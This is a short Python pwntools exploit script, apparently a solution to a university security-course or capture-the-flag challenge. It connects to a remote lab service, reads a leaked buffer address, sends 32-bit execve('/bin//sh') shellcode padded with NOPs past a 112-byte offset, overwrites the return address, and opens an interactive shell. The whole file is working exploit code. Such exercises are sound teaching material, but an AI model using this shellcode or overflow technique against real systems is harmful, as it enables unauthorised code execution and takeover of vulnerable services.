from pwn import *

local=False

# when using terminator
context.terminal = ["terminator", "-e"]

if local:
    sh = process('./shellcode')
else:
    sh=remote("tpas.alunos.dcc.fc.up.pt",5002)

sh.recvuntil("> ")

sh.sendline("2")

inline = sh.recvline() # leaked address for buffer A
sh.recv() # Give me the first string:

leaked_addr = inline.split(":")[-1].strip().split(" ")[-1].strip()
print leaked_addr

eip = p32(int(leaked_addr, 16)) # p64 for 64 bits

#gdb.attach(sh)

# execve for scanf (bypass chars that terminate read before expected)
shellcode ="\x31\xc0\x50\x68"
shellcode +="\x2f\x2f\x73\x68"
shellcode +="\x68\x2f\x62\x69"
shellcode +="\x6e\x89\xe3\x50"
shellcode +="\x53\x89\xe1\x31"
shellcode +="\xc0\x40\x40\x40"
shellcode +="\x40\x40\x40\x40"
shellcode +="\x40\x40\x40\x40"
shellcode +="\xcd\x80"

# b * 0x080486cb # GDB: compareStrings ret
NOP = "\x90"

# we need to overflow the first buffer input
offset = 112

#attach(sh)

buf1_payload = shellcode.ljust(offset, NOP) + eip
buf2_payload = ""

sh.sendline(buf1_payload)
sh.recv()
sh.sendline(buf2_payload)

sh.clean()

# when we get a shell
sh.interactive()

